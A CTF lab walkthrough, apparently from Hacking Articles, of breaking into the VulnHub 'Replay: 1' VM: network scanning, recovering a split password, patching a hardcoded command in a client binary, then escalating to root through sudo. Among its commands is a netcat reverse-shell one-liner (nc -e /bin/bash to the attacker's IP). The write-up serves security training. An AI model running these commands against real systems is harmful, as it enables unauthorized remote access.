@@ -1,0 +1,78 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Replay: 1: Vulnhub Lab Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/replay-1-vulnhub-lab-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-03-04T11:04:33+00:00">March 4, 2019</time><time class="updated" datetime="2025-06-10T20:11:50+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello friends! Today we are going to take another boot2root challenge known as “Replay: 1”. The credit for making this VM machine goes to “c0rruptedb1t” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download this VM <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/replay-1,278/#download">here</a>.</span></span></p>
+<p><span style="color: #000000;"><strong>Security Level</strong>: Intermediate</span></p>
+<p><span style="color: #000000;"><strong>Flags</strong>: There is one flag (flag.txt).</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">IP Discovery using netdiscover</span></li>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Surfing HTTPS service port (80)</span></li>
+<li><span style="color: #000000;">Enumerating password from Source code.</span></li>
+<li><span style="color: #000000;">Enumerating robots.txt and finding the zip file</span></li>
+<li><span style="color: #000000;">Unzipping zip file</span></li>
+<li><span style="color: #000000;">Enumerating password from the binary file</span></li>
+<li><span style="color: #000000;">Enumerating the hardcoded command</span></li>
+<li><span style="color: #000000;">Editing the hardcoded command</span></li>
+<li><span style="color: #000000;">Getting a reverse shell</span></li>
+<li><span style="color: #000000;">Enumerating password for the user</span></li>
+<li><span style="color: #000000;">Elevate Privileges to get root</span></li>
+<li><span style="color: #000000;">Getting Flag</span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dAGyhUzYfKM/XH0CBxFj_WI/AAAAAAAAdSw/Jehu0-yn_go6qactr_KB_qCLz7He7NP_ACLcBGAs/s1600/0.png"/></span></p>
+<p><span style="color: #000000;">We found our target –&gt; 192.168.1.37</span></p>
+<p><span style="color: #000000;">Our next step is to scan our target with nmap.</span></p>
+<pre class="lang:default decode:true">nmap -p- -A 192.168.1.37</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-GHbS_2lX-ow/XH0CBzgxt7I/AAAAAAAAdS4/YYVkbkUfds4CUmevQpPI-E7iO41eFBRMgCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">The NMAP output shows us that there are 3 ports open: 22(SSH), 80(HTTP), 1337(Unknown)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Cw3i3Ey_3CI/XH0CEuHyi2I/AAAAAAAAdTU/nZkYPsvpZUEWKs1GLx1ROMjB4ReH4rCBwCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">We find that port 80 is running http, so we open the IP in our browser.</span></p>
+<p><span style="color: #000000;">We take a look at the source code of web page and at the top of the source code, we find a string inside a comment. We are not able to do anything with it, so we save it for later.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-N5Sh5AUMQsc/XH0CEgmHQRI/AAAAAAAAdTY/qI218Rpke5Ylu_JQQvNHmUObUF7AT9ndQCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Nmap scan shows us that there is one entry inside robots.txt. We open robots.txt and find an entry called “/bob_db.zip”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/--TYsjNMmtAE/XH0CFNHHbFI/AAAAAAAAdTc/YY7_RBODUwM5gIo_03wzf8yyn8H64_POwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">We open the link and download the zip file from the web server. After downloading the file, we extract it and find 64-bit ELF file and a text file. We take a look at the content of the text file and don’t find anything of use.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-BQnrO72gkmQ/XH0CFMMagRI/AAAAAAAAdTg/ghHWf9Tqd84IAhHPqxX1F9s4Qmtan6pGQCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">When we run the application “client.bin”, it asks for an IP address and a password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-s2haY0qSULo/XH0CFZwSPSI/AAAAAAAAdTk/64gh12nG054H-8drKYUgqVTrUcljCKWGQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">As we have no clue for the password, we check the strings inside the application and there we find a hint for the password. Inside the application, we find the second half of the password. Now earlier inside the web page, we found a strange string that might be the first half of the password.</span></p>
+<p><span style="color: #000000;"><strong>Password: qGQjwO4h6gh0TAIRNXuQcDu9Lqsyul</strong></span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-6e38kABbbfA/XH0CFrJbz8I/AAAAAAAAdTo/SXOLcVTxGTAyzrykh0ubJONSneNhvJT3ACLcBGAs/s1600/7.png"/></strong></span></p>
+<p><span style="color: #000000;">We joined the string and use it as a password for the application. After giving the password, we successfully able to login, and find that we can run commands. But when we type a command we get an error stating that we are sending unauthorized packets and the connection gets closed.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cFCQd0vNu48/XH0CF0yOI4I/AAAAAAAAdTs/R2_CsP0PY50s4CqO7ACgUS8J2PB-i1vvACLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Now when we take a closer look at the application we find that the command “;whoami” is hardcoded in the application.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-tTzoYCgrA-o/XH0CGJHQgKI/AAAAAAAAdTw/H7rrmhYACqwiWulNZbiSNoH1klDnCGR_wCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">We try to edit the application and change “;whoami” command to something else and find that the size of string inside the application should remain the same and the command should always start with a semi-colon. So we changed the “;whoami” to “;uname -a” keeping the number of characters inside the application the same by replacing existing characters inside the application.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Ag79-8wTYkE/XH0CBw5jWlI/AAAAAAAAdS0/Qbn6JDVIojY0ADC3LAV7xCSAakDxezHegCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Now when we run the application and give the password we are successfully able to execute our command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gnOMapyUao0/XH0CCv1MkkI/AAAAAAAAdS8/tj3bV6OpWXQP3Vy-c_ufuKaUxTOil04nwCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Now we replace the entire string with our netcat reverse shell one-liner and used extra characters to keep the size of the application the same.</span></p>
+<pre class="lang:default decode:true">nc -e /bin/bash 192.168.1.25 4444;ls;ls;ls;ls;ls;ls;ls;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-n7c0muSPS1w/XH0CDQSvfiI/AAAAAAAAdTA/oydIouGgIBgCMGez6qLjGUKSiqJIUdqIgCLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Now we run the application and give the correct the password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-zJ-AMX6y7zc/XH0CDp2rBPI/AAAAAAAAdTE/qy_oiIt4pig7LyF2E-XVEmCRAmVprXK9QCLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">We setup our listener and are successfully able to get a reverse shell. After getting a reverse shell we spawn a TTY shell using python.</span></p>
+<pre class="lang:default decode:true">nc -lvp 4444
+python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-bmmJIMIgsI8/XH0CD3ZfDtI/AAAAAAAAdTI/FFar1H4KF_4AUoCHxnLz25jsRyLucfl1ACLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">Enumerating through the directories inside “~/Documents/.ftp” we find a file called “users.passwd”. We open it and find the password for user “bob”. Now we check the sudoers list and find that we can run all commands as root user.</span></p>
+<pre class="lang:default decode:true">sudo -l</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SnbfkhvPZm4/XH0CEAlVW1I/AAAAAAAAdTM/k_emn7PPDn8k-ot563rzeYOLIImS49VQwCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">As we have the password for user bob, we spawn a shell as the root user. We go to “/” directory and find a file called “flag.txt”. We take a look at the content of the file and find the congratulatory flag.</span></p>
+<pre class="lang:default decode:true">sudo -i 
+cd /
+cat flag.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vos7bN3Oey4/XH0CEeERGDI/AAAAAAAAdTQ/g3GM_0zdDecsJGwIbySpp7oX_vH-VsNUwCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast<strong>. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/">Here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
